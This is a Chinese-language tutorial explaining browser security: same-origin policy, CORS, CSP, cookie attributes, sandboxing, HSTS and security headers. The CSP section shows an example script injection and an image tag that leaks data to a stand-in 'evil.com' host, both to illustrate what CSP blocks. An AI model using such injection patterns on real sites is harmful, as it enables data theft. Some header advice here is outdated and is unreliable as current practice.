# 浏览器安全模型

## 浏览器安全基础 {#browser-security-foundations}

浏览器作为 Web 应用的主要入口，构建了多层安全防护体系。这个安全模型基于**沙箱隔离**和**同源策略**两大核心原则，确保不同网站之间相互隔离，防止恶意网站窃取用户数据或攻击系统。

安全层次示意图：
```
用户界面 -> 浏览器内核 -> 渲染引擎 -> JavaScript引擎
    ↓           ↓           ↓           ↓
 地址栏安全   网络请求     DOM操作    脚本执行
   提示       安全校验     隔离控制    沙箱限制
```

## 同源策略 {#same-origin-policy}

### 同源定义与规则

**同源定义**：协议、域名、端口三者完全一致才视为同源。

同源判断示意图：
```
URL1: https://www.example.com:443/page.html
URL2: https://www.example.com:443/api/data  → 同源 ✓
URL3: https://api.example.com:443/data      → 不同源 ✗ (域名不同)
URL4: http://www.example.com:80/page.html   → 不同源 ✗ (协议、端口不同)
```

### 跨源限制范围

**严格受限的操作**：
- DOM 访问：禁止跨源 iframe 内容访问
- 网络请求：限制 AJAX 跨源请求
- 存储访问：隔离 Cookie、LocalStorage
- 脚本执行：阻止跨源脚本直接操作

限制示意图：
```
网站A (https://a.com)             网站B (https://b.com)
    |                                |
    |--- 尝试访问 b.com DOM ---> [阻止]
    |--- 发送AJAX到 b.com ---> [阻止]  
    |--- 读取 b.com Cookie --> [阻止]
```

### 跨源资源共享

**CORS 机制**：通过 HTTP 头部协商实现安全跨源访问。

CORS 流程示意图：
```
浏览器 -> 预检请求 OPTIONS
        Origin: https://a.com
        Access-Control-Request-Method: POST
        
服务器 <- 响应
        Access-Control-Allow-Origin: https://a.com
        Access-Control-Allow-Methods: POST, GET
        Access-Control-Allow-Credentials: true
        
浏览器 -> 实际请求 POST (携带Cookie)
```

**CORS 头部详解**：
- `Access-Control-Allow-Origin`：允许的源
- `Access-Control-Allow-Methods`：允许的 HTTP 方法
- `Access-Control-Allow-Headers`：允许的请求头
- `Access-Control-Allow-Credentials`：是否允许携带凭证
- `Access-Control-Max-Age`：预检请求缓存时间

## 内容安全策略 {#content-security-policy}

### CSP 指令系统

CSP 通过白名单机制控制资源加载，防止 XSS 攻击。

CSP 头部示例：
```
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' https://trusted.cdn.com;
  style-src 'self' 'unsafe-inline';
  img-src *;
  connect-src 'self';
  font-src 'self' https://fonts.gstatic.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
```

资源控制示意图：
```
页面加载 -> CSP策略检查 -> 允许/阻止资源
    ↓           ↓           ↓
<script>    script-src   阻止恶意脚本
 <img>        img-src     允许所有图片
 @font-face  font-src   限制字体来源
```

### CSP 防护效果

**XSS 防护机制**：
```
攻击者注入: <script>alert('XSS')</script>
CSP策略: script-src 'self'
防护结果: 阻止内联脚本执行，仅允许同源脚本
```

**数据泄露防护**：
```
恶意代码: <img src="http://evil.com?data=leak">
CSP策略: img-src 'self'
防护结果: 阻止图片请求到外部域名
```

## Cookie 安全机制 {#cookie-security-mechanisms}

### 安全属性

**Cookie 安全三要素**：
```
Set-Cookie: 
  sessionid=abc123;
  Secure;     // 仅HTTPS传输
  HttpOnly;   // 禁止JavaScript访问
  SameSite=Lax; // 限制跨站请求携带
```

属性效果示意图：
```
JavaScript -> document.cookie -> [HttpOnly阻止访问]
HTTP请求 -> Cookie: sessionid=abc123 -> [Secure要求HTTPS]
跨站请求 -> 引用者验证 -> [SameSite限制携带]
```

### SameSite 策略

**三种模式对比**：
- `Strict`：完全禁止跨站携带
- `Lax`：允许安全跨站 (导航行为)
- `None`：允许所有跨站 (需配合 Secure)

行为示意图：
```
网站A链接到网站B -> GET请求 -> Lax允许携带Cookie
网站A表单提交到B -> POST请求 -> Lax阻止携带Cookie
网站A嵌入B的图片 -> 无用户交互 -> 所有模式阻止携带
```

## 沙箱隔离机制 {#sandbox-isolation}

### 进程沙箱

现代浏览器采用多进程架构，实现资源隔离。

进程模型示意图：
```
浏览器进程 (管理)
    ↓
渲染进程 (沙箱内) -> 网页内容执行
    ↓
GPU进程 (硬件加速)    
网络进程 (资源加载)
存储进程 (数据访问)
```

沙箱限制：
```
渲染进程尝试 -> 系统调用 -> 浏览器进程代理 -> 权限检查
    ↓           ↓           ↓           ↓
 文件操作   ->  拦截    ->  验证路径   ->  允许/拒绝
 网络请求   ->  拦截    ->  检查策略   ->  转发/阻止
```

### iframe 沙箱

**沙箱属性控制**：
```html
<iframe sandbox="allow-scripts allow-same-origin" 
        src="https://untrusted.com">
</iframe>
```

可用权限：
- `allow-scripts`：允许执行脚本
- `allow-same-origin`：保持同源权限
- `allow-forms`：允许表单提交
- `allow-popups`：允许打开弹窗

## 安全传输保障 {#secure-transport}

### HTTPS 强制

**混合内容拦截**：
```
HTTPS页面 -> 加载HTTP资源 -> 浏览器拦截
    ↓           ↓           ↓
 安全上下文   ->  不安全资源   ->  阻止加载/警告
```

**HSTS 机制**：
```
首次访问: http://example.com -> 302重定向到HTTPS
服务器响应: Strict-Transport-Security: max-age=31536000
后续访问: 浏览器自动使用HTTPS，跳过HTTP
```

### 安全上下文

**特权 API 限制**：
```
安全上下文 (HTTPS/localhost) -> 允许访问敏感API
非安全上下文 (HTTP) -> 限制访问:
    - Geolocation API
    - Camera/Microphone
    - Service Workers
    - Push Notifications
```

## 客户端存储安全 {#client-storage-security}

### 存储隔离

**同源存储策略**：
```
https://a.com -> LocalStorage -> 数据隔离
https://b.com -> LocalStorage -> 独立空间
    ↓           ↓           ↓
 无法互访   ->  加密数据   ->  独立配额
```

### 安全存储实践

**敏感数据处理**：
```
用户密码 -> 哈希处理 -> 不存储明文
会话令牌 -> HttpOnly Cookie -> 防XSS窃取
个人数据 -> 加密存储 -> 防直接读取
临时数据 -> SessionStorage -> 会话结束清除
```

## 点击劫持防护 {#clickjacking-protection}

### X-Frame-Options 

**防护头部**：
```
X-Frame-Options: DENY           // 禁止所有嵌入
X-Frame-Options: SAMEORIGIN     // 仅允许同源嵌入
X-Frame-Options: ALLOW-FROM uri // 允许指定源嵌入
```

### Frame-Ancestors 

**CSP 增强防护**：
```
Content-Security-Policy: frame-ancestors 'none'
Content-Security-Policy: frame-ancestors 'self' https://trusted.com
```

防护效果示意图：
```
恶意网站 -> 嵌入目标页面在透明iframe -> 诱骗点击
浏览器检查 -> frame-ancestors策略 -> 阻止加载/显示空白
```

## 安全头强化 {#security-headers-hardening}

### 综合防护头

**完整安全头配置**：
```
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Referrer-Policy: strict-origin-when-cross-origin
Content-Security-Policy: default-src 'self'
Feature-Policy: geolocation 'none'; microphone 'none'
```

### 功能策略

**API 权限控制**：
```
Feature-Policy: 
  camera 'none';
  microphone 'none'; 
  geolocation 'self';
  payment 'self' https://payment.com
```

控制效果：
```
网站尝试访问摄像头 -> 策略检查 -> 权限拒绝
网站请求地理位置 -> 策略检查 -> 同源允许
```

## 现代浏览器安全特性 {#modern-browser-security}

### 站点隔离

**跨站防护增强**：
```
传统模式: 同源页面共享进程 -> Spectre漏洞风险
站点隔离: 每个站点独立进程 -> 防止跨站数据泄露
```

### 凭据管理

**密码保护机制**：
```
密码泄露检测: 哈希前缀与泄露数据库比对
自动填充保护: 仅相同站点自动填充
密码导入导出: 加密格式保证安全
```

浏览器安全模型通过层层防护，构建了强大的纵深防御体系，从网络传输到本地执行，从数据存储到用户交互，全方位保护用户安全和隐私。